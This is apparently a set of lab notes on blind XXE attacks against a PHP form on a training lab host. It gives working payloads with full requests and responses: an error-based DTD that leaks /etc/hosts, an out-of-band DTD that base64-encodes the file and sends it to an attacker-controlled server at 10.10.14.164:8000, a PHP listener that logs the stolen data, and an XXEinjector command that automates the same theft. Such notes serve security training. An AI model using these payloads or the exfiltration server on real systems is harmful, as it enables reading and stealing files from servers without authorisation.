# Blind XXE

## Error-Based

### Identification

```http title="Request" hl_lines="1 19"
POST /error/submitDetails.php HTTP/1.1
Host: 10.129.119.114
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 134
Origin: http://10.129.119.114
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.119.114/error/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<root>
<name></name>
<tel></tel>
<email>&error;</email>
<message></message>
</root>
```

### Identification (Response)

```http title="Response" hl_lines="11"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 23:25:01 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 926
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<br />
<b>Warning</b>:  DOMDocument::loadXML(): Entity 'error' not defined in Entity, line: 5 in <b>/var/www/html/error/submitDetails.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/error/submitDetails.php</b> on line <b>12</b><br />
<br />
<b>Notice</b>:  Trying to get property 'name' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>13</b><br />
<br />
<b>Notice</b>:  Trying to get property 'tel' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>14</b><br />
<br />
<b>Notice</b>:  Trying to get property 'email' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>15</b><br />
<br />
<b>Notice</b>:  Trying to get property 'message' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>16</b><br />
Check your email for further instructions.
```

### Reading Sensitive Files

```dtd title="xxe.dtd" linenums="1"
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % xxe "<!ENTITY content SYSTEM '%error;%file;'>">
```

```sh
my@attack:~$ python3 -m http.server 8000
```

```http title="Request" hl_lines="15-19"
POST /error/submitDetails.php HTTP/1.1
Host: 10.129.119.114
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 134
Origin: http://10.129.119.114
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.119.114/error/
Priority: u=0

<!DOCTYPE email [
<!ENTITY % dtd SYSTEM "http://10.10.14.164:8000/xxe.dtd">
%dtd;
%xxe;
]>
```

### Reading Sensitive Files (Response)

```http title="Response" hl_lines="13-21"
HTTP/1.1 200 OK
Date: Mon, 16 Jun 2025 23:41:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1509
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<br />
<b>Notice</b>:  DOMDocument::loadXML(): PEReference: %error; not found in http://10.10.14.164:8000/xxe.dtd, line: 2 in <b>/var/www/html/error/submitDetails.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Invalid URI: 127.0.0.1 localhost
127.0.1.1 academy_webattacks_xxe

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters in Entity, line: 10 in <b>/var/www/html/error/submitDetails.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity, line: 6 in <b>/var/www/html/error/submitDetails.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  simplexml_import_dom(): Invalid Nodetype to import in <b>/var/www/html/error/submitDetails.php</b> on line <b>12</b><br />
<br />
<b>Notice</b>:  Trying to get property 'name' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>13</b><br />
<br />
<b>Notice</b>:  Trying to get property 'tel' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>14</b><br />
<br />
<b>Notice</b>:  Trying to get property 'email' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>15</b><br />
<br />
<b>Notice</b>:  Trying to get property 'message' of non-object in <b>/var/www/html/error/submitDetails.php</b> on line <b>16</b><br />
Check your email for further instructions.
```

## Out-of-Band

```dtd title="xxe.dtd" linenums="1"
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
<!ENTITY % xxe "<!ENTITY content SYSTEM 'http://10.10.14.164:8000/?0=%file;'>">
```

```php title="index.php" linenums="1"
<?php
if (isset($_GET[0]))
{
    error_log("\n\n" . base64_decode($_GET[0]));
}
?>
```

```sh
my@attack:~$ php -S 0.0.0.0:8000
```

```http title="Request" hl_lines="1 16-20 22"
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.119.114
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 167
Origin: http://10.129.119.114
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.119.114/blind/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
<!ENTITY % dtd SYSTEM "http://10.10.14.164:8000/xxe.dtd">
%dtd;
%xxe;
]>
<root>
&content;
</root>
```

## [Automated](https://github.com/enjoiz/XXEinjector) Out-of-Band

```http title="/tmp/request.txt" linenums="1" hl_lines="16"
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.119.114
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 167
Origin: http://10.129.119.114
Sec-GPC: 1
Connection: keep-alive
Referer: http://10.129.119.114/blind/
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```sh
my@attack:~/XXEinjector$ ruby XXEinjector.rb --host=10.10.14.164 --httpport=8000 --file=/tmp/request.txt --path=/etc/hosts --oob=http --phpfilter --fast
my@attack:~/XXEinjector$ cat Logs/10.129.119.114/etc/hosts.log
```

```output title="Output"
127.0.0.1 localhost
127.0.1.1 academy_webattacks_xxe

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
